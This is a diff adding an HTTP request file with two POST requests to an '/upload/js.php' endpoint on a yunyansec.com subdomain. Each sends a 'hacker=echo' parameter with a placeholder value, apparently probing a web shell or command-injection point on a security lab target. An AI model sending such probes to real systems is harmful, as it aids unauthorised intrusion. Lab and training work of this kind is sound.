@@ -1,0 +1,14 @@
+POST http://99dad046.yunyansec.com/upload/js.php
+Accept: text/html
+
+hacker=echo"<???>"
+
+###
+
+POST http://99dad046.yunyansec.com/upload/js.php
+Content-Type: text/html;
+
+hacker=echo"<???>"
+
+###
+
